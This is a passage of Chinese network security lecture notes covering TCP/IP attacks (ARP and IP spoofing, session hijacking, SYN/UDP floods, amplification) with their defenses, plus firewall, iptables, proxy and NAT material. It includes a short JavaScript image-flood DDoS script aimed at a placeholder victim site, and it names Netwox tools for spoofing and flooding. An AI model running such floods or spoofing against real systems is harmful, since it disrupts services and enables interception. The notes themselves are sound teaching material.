–商业路由器、交换机支持Netflow日志输出\n\n  –开源软件: nfdump(支持Netflow标准), Argus\n\n- 网络流分析\n\n  –基于pcap文件上的流重组和统计分析\n\n- Wireshark: 协议分类/会话列表…\n\n- SnifferPro\n\n  –NetflowAnalyzer: HP openview/cacti/nfsen\n\n## 11.13 嗅探实例——网站指纹\n\n{% asset_img 网站指纹1.png 网站指纹1 %}\n\n{% asset_img 网站指纹2.png 网站指纹2 %}\n\n{% asset_img 网站指纹3.png 网站指纹3 %}\n\n# 12. TCP/IP网络协议攻击\n\n## 12.1 网络安全属性\n\n- 网络安全CIA属性\n\n  –保密性(Confidentiality)\n\n  –完整性(Integrity)\n\n  –可用性(Availability)\n\n- 其他三个补充属性\n\n  –真实性(Authentication)\n\n  –不可抵赖性(Non-Repudiation) \n\n  –可审查性(Accountability)\n\n## 12.2 网络攻击基本模式\n\n在 x. 800和 RFC 2828中使用的一种有用的安全攻击分类方法是被动攻击和主动攻击。\n\n### 12.2.1 被动攻击\n\n被动攻击试图从系统中学习或使用信息，但不影响系统资源。\n\n被动攻击的本质是窃听或监听传输。对手的目标是获取正在传输的信息。被动攻击有两种类型:\n\n+ 发布消息内容\n\n{% asset_img 窃听.png 窃听 %}\n\n+ 流量分析——监控流量，以确定通信主机的位置和身份，并可以观察交换消息的频率和长度\n\n{% asset_img 流量分析.jpg 流量分析 %}\n\n这些攻击很难发现，因为它们不涉及对数据的任何更改。\n\n### 12.2.2 主动攻击\n\n主动攻击包括修改数据流或创建虚假数据流，可以细分为4个类别: 伪装、重放、篡改消息和分布式拒绝服务攻击：\n\n- 把一个实体伪装成另一个实体\n\n{% asset_img 伪装.png 伪装 %}\n\n- 重播以前的讯息\n\n{% asset_img 重放.png 重放 %}\n\n- 修改/改变传输中的信息以产生未经授权的效果\n\n{% asset_img 篡改.png 篡改 %}\n\n- 分布式拒绝服务攻击——防止或抑制通讯设施的正常使用或管理\n\n{% asset_img 拒绝服务.png 拒绝服务 %}\n\n主动攻击呈现出与被动攻击相反的特征。虽然被动攻击很难被发现，但可以采取措施防止其成功。另一方面，由于潜在的物理、软件和网络漏洞种类繁多，要完全防止主动攻击是相当困难的。相反，我们的目标是检测主动攻击，并从它们造成的任何干扰或延迟中恢复。\n\n### 12.2.3 对攻击的一般处理原则\n\n- 被动攻击 – 侧重于阻止\n\n  --容易阻止\n\n  --难于检测\n\n- 主动攻击 – 侧重于检测与恢复\n\n  --难于阻止\n\n  --容易检测\n\n考虑安全服务的作用，可能需要什么。注意到两个的异同与传统的纸质文件，例如：\n\n- 有签名、日期；\n- 需要从披露的保护、篡改或销毁；\n- 可经公证和见证；\n- 可以记录或许可。 \n\n### 12.2.4 中间人攻击(MITM攻击)\n\n- 通信双方\n\n  –Alice & Bob\n\n- 中间人\n\n  –Mallory\n\n  –与通信双方建立起各自独立的会话连接\n\n  –对双方进行身份欺骗\n\n  –进行消息的双向转发\n\n  –必要前提：拦截通信双方的全部通信(截获)、转发篡改消息(篡改)、双方身份欺骗(伪造)\n\n  –现实世界中的中间人攻击–国际象棋欺骗术\n\n{% asset_img 中间人攻击.png 中间人攻击 %}\n\n## 12.3 安全缺陷与攻击技术\n\n{% asset_img 安全缺陷与攻击技术.png 安全缺陷与攻击技术 %}\n\n## 12.4 原始报文伪造技术及工具\n\n- 原始报文伪造技术\n\n  –伪造出特制的网络数据报文并发送\n\n  –原始套接字(Raw Socket)\n\n- Netwox/Netwag\n\n  –超过200个不同功能的网络报文生成与发送工具\n\n  –#netwoxnumber [parameters ... ]\n\n### 12.4.1 Netwox工具使用 \n\n- Netwox: 命令行\n\n- Netwag: 窗口, TCL支持\n\n- Wireshark捕获网络包\n\n- 工具32：伪造以太网包\n\n## 12.5 网络层协议攻击\n\n### 12.5.1 IP源地址欺骗\n\n- IP源地址欺骗\n\n  –伪造具有虚假源地址的IP数据包进行发送\n\n  –目的：隐藏攻击者身份、假冒其他计算机\n\n- IP源地址欺骗原理\n\n  –路由转发只是用目标IP地址，不对源做验证\n\n  –现实世界中的平信\n\n  –通常情况：无法获得响应包\n\n{% asset_img IP源地址欺骗.jpg IP源地址欺骗 %}\n\n- 假冒IP攻击\n\n  - 可以嗅探响应包的环境\n\n    ​\t–同一局域网\n\n    ​\t–ARP欺骗、重定向攻击劫持响应包\n\n  - 盲攻击(blind attack)\n\n    ​\t–Robert T. Morris在1985年提出\n\n    ​\t–Kevin Mitinick在1995年仍使用\n\n    ​\t–通过猜测TCP三次握手中所需的信息，假冒IP建立起TCP连接\n\n#### 12.5.1.1 TCP连接的基本信息\n\n五元组(srcip(源IP), srcport, dstip, dstport, proto)\n\n反映传输状态(seq, ack)\n\n#### 12.5.1.2 盲攻击过程\n\n{% asset_img 盲攻击过程.jpg 盲攻击过程 %}\n\n#### 12.5.1.3 IP源地址欺骗技术的应用场景\n\n- 普遍应用场景\n\n  –拒绝服务攻击：无需或不期望响应包，节省带宽，隐藏攻击源\n\n  –网络扫描(nmap -D)：将真正扫描源隐藏于一些欺骗的源IP地址中\n\n- 假冒IP攻击场景\n\n  –对付基于IP地址的身份认证机制\n\n  - 类Unix平台上的主机信任关系\n\n  - 防火墙或服务器中配置的特定IP访问许可\n\n  –远程主机IP欺骗-盲攻击，较难成功\n\n#### 12.5.1.4 利用Netwox进行IP源地址欺骗\n\n工具34/38\n\n#### 12.5.1.5 IP源地址欺骗的防范措施\n\n- 使用随机化的初始序列号以避免远程的盲攻击\n\n- 使用网络层安全传输协议如IPsec\n\n  –避免泄露高层协议可供利用的信息及传输内容\n\n- 避免采用基于IP地址的信任策略\n\n  –以基于加密算法的用户身份认证机制来替代\n\n- 在路由器和网关上实施包检查和过滤\n\n  –入站过滤机制(ingress filtering)\n\n  –出站过滤机制(egress filtering)\n\n### 12.5.2 ARP欺骗\n\n- ARP协议工作原理\n\n  –将网络主机的IP地址解析成其MAC地址\n\n  –①每台主机设备上都拥有一个ARP缓存(ARP Cache)\n\n  –②检查自己的ARP缓存，有，直接映射，无，广播ARP请求包\n\n  –③检查数据包中的目标IP地址是否与自己的IP地址一致，如一致，发送ARP响应，告知MAC地址\n\n  –④源节点在收到这个ARP响应数据包后，将得到的目标主机IP地址和MAC地址对映射表项添加到自己的ARP缓存中\n\n{% asset_img ARP协议.jpg ARP协议 %}\n\n#### 12.5.2.1 ARP欺骗攻击技术原理\n\nARP欺骗：发送伪造ARP消息，对特定IP所对应的MAC地址进行假冒欺骗，从而达到恶意目的。\n\n{% asset_img ARP欺骗.jpg ARP欺骗 %}\n\n- 网关ARP欺骗\n\n{% asset_img 网关ARP欺骗.png 网关ARP欺骗 %}\n\n#### 12.5.2.2 ARP欺骗技术的应用场景\n\n- 利用ARP欺骗进行交换网络中的嗅探\n\n- ARP欺骗构造中间人攻击，从而实施TCP会话劫持\n\n- ARP病毒\n\n- ARP欺骗挂马\n\n#### 12.5.2.3 利用Netwox进行ARP欺骗\n\n工具33\n\n#### 12.5.2.4 ARP欺骗攻击防范措施\n\n- 静态绑定关键主机的IP地址与MAC地址映射关系\n\n  –网关/关键服务器\n\n  –“arp -s IP地址 MAC地址类型\"\n\n- 使用相应的ARP防范工具\n\n  –ARP防火墙\n\n- 使用VLAN虚拟子网细分网络拓扑\n\n- 加密传输数据以降低ARP欺骗攻击的危害后果\n\n### 12.5.3 ICMP路由重定向攻击\n\n- ICMP路由重定向攻击\n\n  –伪装成路由器发送虚假的ICMP路由路径控制报文\n\n  –使受害主机选择攻击者指定的路由路径\n\n  –攻击目的：嗅探或假冒攻击\n\n- 技术原理\n\n  –路由器告知主机：“应该使用的路由器IP地址”\n\n{% asset_img ICMP路由重定向.png ICMP路由重定向 %}\n\n#### 12.5.3.1 ICMP路由重定向攻击技术\n\n- 攻击节点冒充网关IP，向被攻击节点发送ICMP重定向报文，并将指定的新路由器IP地址设置为攻击节点\n\n- 被攻击节点接受报文，选择攻击节点作为其新路由器(即网关)\n\n- 攻击节点可以开启路由转发，实施中间人攻击\n\n- “谎言还是真话”？\n\n#### 12.5.3.2 ICMP路由重定向攻击防范\n\n- 根据类型过滤一些ICMP数据包\n- 设置防火墙过滤\n- 对于ICMP重定向报文判断是不是来自本地路由器\n\n## 12.6 传输层协议攻击\n\n### 12.6.1 TCP RST攻击\n\n- 中断攻击\n\n  –伪造TCP重置报文攻击(spoofed TCP reset packet)\n\n  –TCP重置报文将直接关闭掉一个TCP会话连接\n\n  –限制条件：通讯目标方接受TCP包\n\n- 通讯源IP地址及端口号一致\n\n- 序列号(Seq)落入TCP窗口之内\n\n  –嗅探监视通信双方的TCP连接，获得源、目标IP地址及端口\n\n  –结合IP源地址欺骗技术伪装成通信一方，发送TCP重置报文给通信另一方\n\n- 应用场景：恶意拒绝服务攻击、重置入侵连接、GFW\n\n  –GFW: “net::ERR_CONNECTION_RESET”\n\n例：针对Google检索的 TCP RESET\n\np4-36-41\n\n### 12.6.2 TCP会话劫持\n\n- 结合嗅探、欺骗技术\n\n- 中间人攻击：注射额外信息，暗中改变通信\n\n- 计算出正确的 seq，ackseq 即可\n\n- TCP会话攻击工具\n\n  –Juggernaut、Hunt、TTY watcher、IP watcher\n\n{% asset_img TCP会话劫持.png TCP会话劫持 %}\n\n#### 12.6.2.1 Hunt工具介绍\n\n- 源码开放的自由软件，可运行在Linux平台上\n\n- 功能特点\n\n  –监听当前网络上的会话\n\n  –重置会话(reset a session)\n\n  –劫持会话\n\n  - 在劫持之后，使连接继续同步\n\n  –确定哪些主机在线\n\n  –四个守护进程\n\n  - 自动reset\n  - Arp欺骗包的转发\n  - 收集MAC地址\n  - 具有搜索功能的sniffer\n\n#### 12.6.2.2 会话劫持的防范措施\n\n- 避免攻击者成为通信双方的中间人\n\n  –部署交换式网络，用交换机代替集线器\n\n  –禁用主机上的源路由\n\n  –采用静态绑定IP-MAC映射表以避免ARP欺\n\n  –过滤ICMP重定向报文\n\n- TCP会话加密(IPsec协议)\n\n  –避免了攻击者在得到传输层的端口及序列号等关键信息\n\n- 防火墙配置\n\n  –限制尽可能少量的外部许可连接的IP地址\n\n- 检测\n\n  –ACK风暴：ACK包的数量明显增加\n\n### 12.6.3 TCP SYN Flood\n\n- 拒绝服务攻击(DoS)\n\n  –破坏可用性\n\n- TCP SYN Flood\n\n  –SYN洪泛攻击\n\n  –利用TCP三次握手协议的缺陷\n\n  –大量的伪造源地址的SYN连接请求\n\n  –消耗目标主机的连接队列资源\n\n  –不能够为正常用户提供服务\n\n{% asset_img TCPSYNFlood.png TCPSYNFlood %}\n\n{% asset_img TCPSYNFlood2.png TCPSYNFlood2 %}\n\n{% asset_img TCPSYNFlood3.png TCPSYNFlood3 %}\n\n#### 12.6.3.1 利用Netwox进行TCP SYN Flood\n\n工具76\n\n#### 12.6.3.2 SYN Flood攻击防范措施-SynCookie\n\n- 弥补TCP连接建立过程资源分配这一缺陷\n\n- 无状态的三次握手\n\n  –服务器收到一个SYN报文后,不立即分配缓冲区\n\n  –利用连接的信息生成一个cookie, 作为SEQ\n\n  –客户端返回ACK中带着ACK = cookie+1\n\n  –服务器端核对cookie, 通过则建立连接，分配资源\n\n{% asset_img SYNFlood防范措施.jpg SYNFlood防范措施 %}\n\n- 有状态防火墙\n\n  –网络中的TCP连接进行状态监控和处理\n\n  –维护TCP连接状态：NEW状态、GOOD状态、BAD状态…\n\n  –三次握手‖代理\n\n{% asset_img 防火墙地址状态监控技术.png 防火墙地址状态监控技术 %}\n\n### 12.6.4 UDP Flood攻击\n\n- UDP协议\n\n  –无状态不可靠\n\n  –仅仅是传输数据报\n\n- UDP Flood\n\n  –带宽耗尽型拒绝服务攻击\n\n  –分布式拒绝服务攻击(DDoS)\n\n  –利用僵尸网络控制大量受控傀儡主机\n\n  –通常会结合IP源地址欺骗技术\n\n#### 12.6.4.1 UDP Flood攻击防范措施\n\n- 禁用或过滤监控和响应服务\n\n- 禁用或过滤其它的UDP 服务\n\n- 网络关键位置使用防火墙和代理机制来过滤掉一些非预期的网络流量\n\n- 遭遇带宽耗尽型拒绝服务攻击\n\n  –终端无能为力\n\n  –补救措施：网络扩容、转移服务器位置\n\n  –事件响应：汇报给安全应急响应部门、追溯和处置\n\n  –流量清洗解决方案：ISP为关键客户/服务所提供\n\n#### 12.6.4.2 另类DoS攻击\n\n##### 12.6.4.2.1 流量放大攻击\n\n- 对单个较小的UDP请求包回复以一个较大的UDP响应包的服务，可被用来放大 DOS 攻击\n- 攻击者伪造网络包，将其源地址设为受害者的 IP 地址，当服务产生响应时，大量的数据会发向受害者的地址。\n- 攻击者需要提供这类服务的大量地址以展开攻击，否则的话，受害者只需简单地丢弃来自这些少量地址的分组就能避免攻击。\n\n{% asset_img 流量放大攻击.png 流量放大攻击 %}\n\n常用的UDP放大器\n\n- DNS：ANY 查询将返回服务器所拥有的域的所有记录\n\n- NTP：MONLIST 返回最近询问时间的 600 个客户端\n\n时至今日，虽然两者都考虑过配置错误的问题, 但在Internet上，保存有十万计的错误配置主机。\n\n##### 12.6.4.2.2 Javascript-based DDoS 攻击\n\n- 简单的一段攻击代码attack.js\n\n```c\nfunction imgflood() {\n  var TARGET = 'victim-website.com'\n  var URI = '/index.php?'\n  var pic = new Image()\n  var rand = Math.floor(Math.random() * 1000)\n  pic.src = 'http://'+TARGET+URI+rand+'=val'\n}\nsetInterval(imgflood, 10)\n```\n\n场景1\n\n{% asset_img 场景一.png 场景一 %}\n\n场景2\n\n{% asset_img 场景二.png 场景二 %}\n\n场景3\n\n{% asset_img 场景三.png 场景三 %}\n\n解决方案\n\n{% asset_img 解决方案.png 解决方案 %}\n\n## 12.7 TCP/IP网络协议栈攻击防范措施\n\n### 12.7.1 监测、预防与安全加固\n\n- 网络接口层–主要安全威胁是网络嗅探\n\n  –局域网中的监听点检测\n\n  –网络设计上尽量细分和优化网络结构\n\n  –关键路径上的网关、路由器等设备的严格安全防护\n\n  –各类网络采用上层的加密通信协议\n\n- 互联层\n\n  –多种检测和过滤技术来发现和阻断网络中欺骗攻击\n\n  –增强防火墙、路由器和网关设备的安全策略(egress filtering)\n\n  –关键服务器使用静态绑定IP-MAC映射表、使用IPsec协议加密通讯等预防机制\n\n- 传输层：加密传输和安全控制机制(身份认证，访问控制)\n\n- 应用层：加密，用户级身份认证，数字签名技术，授权和访问控制技术以及主机安全技术如审计、入侵检测\n\n### 12.7.2 网络安全协议\n\n- 网络接口层\n\n  –无线：WPA/WPA2\n\n  –统一认证：802.1X\n\n- 网络互联层\n\n  –IPsec协议簇\n\n  –AH协议：完整性、认证、抗重放攻击\n\n  –ESP协议：机密性、数据源验证、抗重放、完整性\n\n- 传输层\n\n  –TLS/SSL: 加密、可靠\n\n- 应用层\n\n  –HTTPS、S/MIME、SET\n\n{% asset_img 网络安全协议.png 网络安全协议 %}\n\n# 13. 网络安全防护技术\n\n## 13.1 安全模型-P2DR模型\n\n### 13.1.1 信息安全技术与安全模型的发展\n\n- COMSEC –通信安全\n\n  –保护军事等机密信息，机密(Confidentiality)\n\n  –专门针对机密性的BLP(Bell-La Padula)多级安全策略模型\n\n- COMPSEC -计算机安全\n\n  –完整性(Integrity)也被纳入了核心安全属性\n\n  –引入身份认证、访问控制技术\n\n  –针对完整性保护的Biba模型和Clark-Wilson模型\n\n- NETSEC -网络安全\n\n  –网络信息服务的可用性(Availability)也上升成为核心的安全属性\n\n- IA –信息保障(NSA)\n\n  –机密性、完整性、可用性、真实性、不可抵赖性\n\n  –信息保障体系；纵深安全防护体系\n\n### 13.1.2 安全评估模型与标准\n\n- 安全评估\n\n  –评估信息系统是否能够满足特定的安全需求和属性\n\n- 安全评估模型\n\n  –1985：美国可信计算机安全评估准则TCSEC《桔皮书》\n\n- 分级评估：A\\B\\C\\D\n\n  –199x：欧洲ITSEC安全测评标准\n\n  –1999：Common Criteria(CC)标准\n\n  –1999：GB17859《计算机信息系统安全保护等级划分标准》\n\n- 静态安全模型VS. 动态安全模型(可适应安全模型)\n\n### 13.1.3 PDR安全模型\n\n- PDR: 基于时间的安全(Time-based Security)\n\n  –可以量化，可以计算\n\n  –防御延缓攻击时间，及时的检测和响应\n\nPDR的最基本的意思是，认为安全有三个不可或缺的功能要素：防护、检测、响应。\n\n{% asset_img PDR安全模型.png PDR安全模型 %}\n\nPt：整个防护体系的整体防护时间\n\nDt：检测时间\n\nRt：响应时间\n\n要达到安全，就要$Pt>Dt+Rt$\n\n### 13.1.4 P2DR安全模型\n\n美国ISS公司提出的动态网络安全体系的代表模型，也是动态安全模型的雏形。\n\n{% asset_img P2DR安全模型.jpg P2DR安全模型 %}\n\n网络安全是相对的，没有绝对的安全。\n\n根据风险分析制定安全策略(Policy)，PDR构成动态闭环。\n\n- P: 执行安全防护策略\n\n  防火墙、身份认证、访问控制、加密\n\n- D: 实时检测\n\n  漏洞评估、入侵检测\n\n- R: 实时响应\n\n  应急响应、备份恢复、灾难恢复\n\n## 13.2 P：防御技术\n\n- 网络防御-边界网络安全设备\n\n  –网络访问控制：防火墙，VPN\n\n  –网络内容控制：SCM\n\n  –IPS（入侵防御系统）, IMS(入侵管理系统), UTM（统一威胁管理）\n\n- 主机防御\n\n  –漏洞扫描和补丁管理\n\n  –个人防火墙\n\n  –防病毒软件\n\n  –系统诊断与恢复软件\n\n- 安全产业“老三样”: 防火墙、入侵检测、防病毒\n\n- 安全产业“新三样”: 安全管理平台、安全服务、个人安全防御\n\n### 13.2.1 防火墙(FireWall)\n\n- 防火墙是一项协助确保信息安全的设备，会依照特定的规则，允许或是限制传输的数据通过。\n- 置于不同的网络安全域之间，对网络流量或访问行为实施访问控制的安全组件或设备。\n- 大楼的“门卫”\n\n{% asset_img firewall.jpg firewall %}\n\n#### 13.2.1.1 防火墙技术关键特性\n\n- 只能对流经的网络数据进行检查控制：边界部署\n\n- 不具备主动检测网络攻击数据能力，需合理设计安全控制策略\n\n- 并非“一劳永逸”的“安全最终解决方案”\n\n#### 13.2.1.2 功能\n\n- 在网络协议栈的各个层次上实施网络访问控制机制\n\n  –网络层：包过滤\n\n  –传输层：电路级代理\n\n  –应用层：应用层代理/网关\n\n- 基本功能：控制在计算机网络中不同信任程度网络域间传送的数据流\n\n  –检查控制进出网络的网络流量\n\n  –防止脆弱或不安全的协议和服务\n\n  –防止内部网络信息的外泄\n\n  –对网络存取和访问进行监控审计\n\n  –防火墙可以强化网络安全策略并集成其他安全防御机制\n\n#### 13.2.1.3 不足\n\n- 作为网络边界防护机制而先天无法防范的安全威胁\n\n  –来自网络内部的安全威胁\n\n  –通过非法外联的网络攻击\n\n  –计算机病毒传播\n\n- 由于技术瓶颈问题目前还无法有效防范的安全威胁\n\n  –针对开放服务安全漏洞的渗透攻击\n\n  –针对网络客户端程序的渗透攻击\n\n  –基于隐蔽通道进行通信的特洛伊木马或僵尸网络\n\n#### 13.2.1.4 防火墙技术类型\n\n- 包过滤防火墙(packet filter)\n\n  –1988, DEC\n\n  –网络包粒度, 工作在网络层, 主要实现形式为路由器ACL\n\n- 状态防火墙(stateful firewall)\n\n  –1980s底, AT&T Bell\n\n  –网络会话粒度,工作在传输层\n\n  –目前防火墙最主要实现方式\n\n- 电路级代理技术\n\n- 应用层代理防火墙(application layer firewall)\n\n  –Paper: 1990 Purdue, AT&T\n\n  –Product: 1991 DEC\n\n  –应用层代理，工作在应用层\n\n{% asset_img OSI模型.png OSI模型 %}\n\n##### 13.2.1.4.1 包过滤防火墙\n\n- 基本的思想很简单\n\n  –对于每个进来的包，适用一组规则，然后决定转发或者丢弃该包\n\n  –往往配置成双向的\n\n- 如何过滤\n\n  –过滤的规则以IP和传输层的头中的域(字段)为基础，包括源和目标IP地址、IP协议域、源和目标端口号\n\n  –过滤器往往建立一组规则，根据IP包是否匹配规则中指定的条件来作出决定。\n\n  –如果匹配到一条规则，则根据此规则决定转发或者丢弃\n\n  –如果所有规则都不匹配，则根据缺省策略\n\n- 根据定义好的过滤规则审查每个数据包，过滤规则基于数据包的报头信息进行制订。\n\n- 报头信息中包括IP源地址、IP目标地址、传输协议(TCP、UDP、ICMP等等)、TCP/UDP目标端口、ICMP消息类型等\n\n{% asset_img 包过滤防火墙.png 包过滤防火墙 %}\n\n- 通常在路由器上实现\n\n  –实际上是一种网络层的访问控制机制\n\n  –路由器ACL机制\n\n- 在网络层上进行监测\n\n  –仅仅根据数据包自身包含的信息(协议头部)进行检查和过滤\n\n  –并没有考虑连接状态信息\n\n- 优点：\n\n  –实现简单\n\n  –对用户透明\n\n  –效率高\n\n- 缺点：\n\n  –正确制定规则并不容易\n\n  –不可能引入认证机制\n\n##### 13.2.1.4.2 状态防火墙\n\n- 状态防火墙\n\n  –跟踪网络会话(连接)状态, 判断报文合法性\n\n  –在网络会话粒度上匹配和实施防火墙规则\n\n  –特性: 状态报文检查(SPI: stateful packet inspection)\n\n{% asset_img 状态防火墙.png 状态防火墙 %}\n\n- 状态防火墙机制\n\n  –跟踪和维护网络连接状态信息(CT: connection table)\n\n  –TCP网络连接\n\n  - SYN包: NEW connections\n  - 经过三次握手: ESTABLISHED connections\n\n  –UDP会话\n\n  - 一般处理UDP包时, 马上设置为ESTABLISHED\n\n  –在网络访问配置规则中支持对状态的匹配\n\n- 目前防火墙产品的主流应用技术\n\n  –国外厂商: Check Point/Cisco/ FORTINET/Juniper…\n\n  –国内厂商: 天融信/联想/方正/…\n\n  –开源软件: Netfilter\\*/IPTables* (Linux)\n\n#### 13.2.1.5 防火墙产品\n\n- 防火墙产品类别\n\n  –集成包过滤功能的路由器\n\n  –基于通用操作系统的防火墙软件产品\n\n  –软件防火墙\n\n  –基于安全操作系统的防火墙\n\n  –软件防火墙+硬件Box\n\n  –硬件防火墙设备\n\n  –硬件防火墙\n\n- 个人防火墙\n\n  –Windows个人防火墙\n\n  –天网防火墙\n\n  –360安全卫士/瑞星\n\n#### 13.2.1.6 防火墙部署方法\n\n- 包过滤路由器\n\n- 双宿主堡垒主机\n\n- 屏蔽主机\n\n- 屏蔽子网\n\n- 几个基本概念\n\n  –堡垒主机(Bastion Host)：对外部网络暴露，同时也是内部网络用户的主要连接点\n\n  –双宿主主机(dual-homed host)：至少有两个网络接口的通用计算机系统\n\n  –DMZ(Demilitarized Zone，非军事区或者停火区)：在内部网络和外部网络之间增加的一个子网\n\n##### 13.2.1.6.1 包过滤路由器部署方案\n\n- 包过滤防火墙功能的路由器\n\n  –内部网络和外部网络之间的唯一连接点\n\n  –路由+ACL\n\n- 优势\n\n  –成本低、易于使用\n\n- 缺点\n\n  –一旦路由器被攻破，内网完全暴露\n\n  –内部网络信息对外公开，可攻击开放的主机和服务\n\n{% asset_img 包过滤路由器.png 包过滤路由器 %}\n\n##### 13.2.1.6.2 双宿主堡垒主机部署方案\n\n- 使用应用代理网关作为双宿主堡垒主机\n\n  –一个使用公网IP地址连接外部网络\n\n  –一个使用私有IP地址连接内部网络\n\n  –由应用代理服务器程序为特定的网络应用提供代理\n\n- 优点：对外屏蔽内网信息、用户级身份认证和行为审计\n\n- 缺点：内网对外访问控制过于严格、堡垒主机安全差、，一旦堡垒主机被攻破，内网也将全面地暴露\n\n{% asset_img 双宿主堡垒.png 双宿主堡垒 %}\n\n##### 13.2.1.6.3 屏蔽主机\n\n- 结合包过滤防火墙和应用层代理\n\n  –两层安全防护\n\n  –包过滤防火墙：网络层的访问控制\n\n  –应用层代理堡垒主机：进行应用安全控制\n\n- 优势：双重安全可靠设计\n\n- 缺点：对外开放服务器成弱点\n\n{% asset_img 屏蔽主机.png 屏蔽主机 %}\n\n##### 13.2.1.6.4 屏蔽子网\n\n- 屏蔽子网：DMZ区\n\n  –应用代理及对外服务器\n\n  –三层安全防护：外网防火墙、应用层代理、内网防火墙\n\n{% asset_img 屏蔽子网.png 屏蔽子网 %}\n\n#### 13.2.1.7 Linux中的开源防火墙\n\n- Netfilter\n\n  –Linux内核中的防火墙模块\n\n  –Netfilter特性\n\n  - 包过滤->状态报文检查\n  - 灵活可扩展框架, 支持NAT网络地址转换, 提供多层API接口以支持第三方扩展\n\n  –Netfilter功能\n\n  - 构建防火墙, NAT共享上网, 利用NAT构建透明代理, 构建QoS或策略路由器, …\n\n- IPTables\n\n  –Linux应用层的防火墙配置工具\n\n  –ipfwadm(2.0.x) -> ipchains(2.2.x) -> iptables(2.4.x/2.6.x)\n\n##### 13.2.1.7.1 Netfilter/iptables的缺省规则表/链\n\n{% asset_img Netfilter iptables的缺省规则表 链.png Netfilter iptables的缺省规则表 链 %}\n\n##### 13.2.1.7.2 Netfilter在Linux协议栈中的hook检查点\n\n- PREROUTING: 进入防火墙数据包, 路由转发前, 实现NAPT/DNAT\n- LOCAL INPUT: 发往本地协议栈的数据包, 实现本地安全防护\n- FORWARD: 经过防火墙转发的数据包, 实现网络流状态过滤\n- LOCAL OUTPUT: 从本地协议栈发出的数据包, 限制对外访问\n- POSTROUTING: 从防火墙发出数据包, 路由转发后, 实现SNAT\n\n{% asset_img hook检查点.png hook检查点 %}\n\n##### 13.2.1.7.3 Netfilter的检查链和处理策略\n\n- Netfilter检查链\n\n  –通过防火墙转发流量: PREROUTINGàFORWARDàPOSTROUTING\n\n  –传入防火墙本机流量: PREROUTINGàINPUT\n\n  –防火墙本机传出流量: OUTPUTàPOSTROUTING\n\n- Netfilter处理策略\n\n  –ACCEPT: 允许数据包经过网络协议栈\n\n  –DROP: 静默地丢弃数据包\n\n  –QUEUE: 通过nf_queue机制将数据包传送至应用层供上层应用处理\n\n  –STOLEN: 保持数据包直到特定条件后处理, 用于处理IP分片等\n\n  –REPEAT: 使得数据包重新进入hook点\n\n##### 13.2.1.7.4 Netfilter的报文状态检查\n\n- 支持的网络连接状态\n\n  –NEW: 新建连接, 连接初始报文或只看到一个方向的数据包\n\n  –ESTABLISHED: 已建连接, 双向通讯\n\n  –RELATED: 相关连接, 用于处理FTP等协商端口的网络协议\n\n  –INVALD: 非法状态\n\n- 实现机制\n\n  –使用hash表等实现CT表, 支持对已记录连接的快速查找\n\n  –在PREROUTING, INPUT, POSTROUTING等hook点上注册callback函数, 用于跟踪网络连接状态\n\n  –支持用户态程序(IPTables)灵活配置各个hook点上的防火墙规则, 对网络连接进行访问控制\n\n##### 13.2.1.7.5 Netfilter防火墙规则过滤 \n\n{% asset_img Netfilter防火墙规则过滤.png Netfilter防火墙规则过滤 %}\n\n##### 13.2.1.7.6 Iptables\n\n- 为用户提供了配置netfilter规则的命令行接口\n\n  –$ iptables[-t table] command [match] [target]\n\n- command-规则配置动作\n\n  –-A(添加)、-D(删除)、-P(缺省策略)、-N(新建链)、-F(清空)、-L(列举)\n\n- match-规则匹配条件\n\n  –通用匹配和特定协议匹配\n\n  –支持“与”关系\n\n- Target-目标操作\n\n  –ACCEPT、DROP、REJECT、RETURN\n\n##### 13.2.1.7.7 Netfilter/iptables的过滤与报文状态检查机制\n\n- 两种策略\n\n  (1) 设置缺省的通行策略为允许(ACCEPT)，然后定义禁止的网络流量和行为；-Bad\n\n  (2) 设置缺省的通行策略为禁止(DROP)，然后定义允许的网络流量和行为；-Good\n\n- 静态包过滤\n\n  –# iptables-t filter -A FORWARD -s 192.168.0.0/24 -d 192.168.1.0/24 -j ACCEPT\n\n- 报文状态检查\n\n  –状态：NEW、ESTABLISHED、RELATED、INVALD\n\n  –# iptables-t filter -A FORWARD -d [WEB_SERVER] -m state --state NEW -j ACCEPT\n\n  –# iptables-t filter -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT\n\n##### 13.2.1.7.8 Netfilter/iptables的NAT机制\n\n- NAT机制类型\n\n  –SNAT：源地址/端口NAT\n\n  –DNAT：目的地址/端口NAT\n\n- NAT功能类型\n\n  –IP伪装（masquerading）：属于SNAT\n\n  - #iptables-t nat-A POSTROUTING -ieth1 -o eth0 -j MASQUERADE\n\n  –透明代理（transparent proxying）：属于DNAT\n\n  - #iptables-t nat-A PREROUTING -ieth1 -j DNAT --to 5.6.7.8\n\n  –端口转发（port forwarding）\n\n  - #iptables-A PREROUTING -t nat-p tcp-d 1.2.3.4 --dport8080 -j DNAT --to 192.168.1.1:80\n\n### 13.2.2 代理技术\n\n- 代理(proxy)实际上也是一种安全防护技术\n\n  –允许客户端通过代理与网络服务进行非直接的连接\n\n  –在代理服务器上可以进行访问控制和内容检查\n\n- 不同类型的代理技术\n\n  –应用层：应用层代理(HTTP代理)\n\n  –传输层：电路级代理(Socks代理)\n\n  –网络层：NAT代理(NAT网关、拨号上网路由器)\n\n#### 13.2.2.1 应用层代理\n\n- 应用层代理\n\n  –也称为应用层网关、代理服务器\n\n  –特定应用层网络服务(HTTP/Email…)\n\n  –MSP –Microsoft Proxy Server、Squid\n\n{% asset_img 应用层代理.png 应用层代理 %}\n\n- 应用层代理优势\n\n  –隐藏内部网络信息\n\n  –通讯中转，严格内容审查\n\n  –存储转发机制，在线审计\n\n  –用户级身份认证机制\n\n- 应用层代理不足\n\n  –不通用、不透明、处理速度较慢、部署代价较高\n\n#### 13.2.2.2 电路级代理\n\n- 电路级代理\n\n  –Socks代理\n\n  –工作在传输层\n\n  –同时为多种不同的应用服务提供支持\n\n- 工作机制\n\n  –TCP层中继\n\n  –建立外部连接，并在连接会话间转发数据\n\n- 差异：通用、用户级身份认证，但无法进行细致内容审查\n\n{% asset_img 电路级代理.png 电路级代理 %}\n\n#### 13.2.2.3 NAT代理-网络地址转换\n\n{% asset_img NAT代理.png NAT代理 %}\n\n{% asset_img 网络地址转换.png 网络地址转换 %}\n\n- NAT(网络地址转换)\n\n  –允许多个用户分享少量或单一的IP地址（源NAT）\n\n  –允许将网络服务映射到内部服务网络IP和端口（目的NAT）\n\n- NAT代理优势\n\n  –方便：任意使用私有网段IP地址，无需申请，无冲突\n\n  –安全：对外隐藏内部网络信息\n\n### 13.2.3 VPN\n\n- VPN－虚拟专有网(Virtual 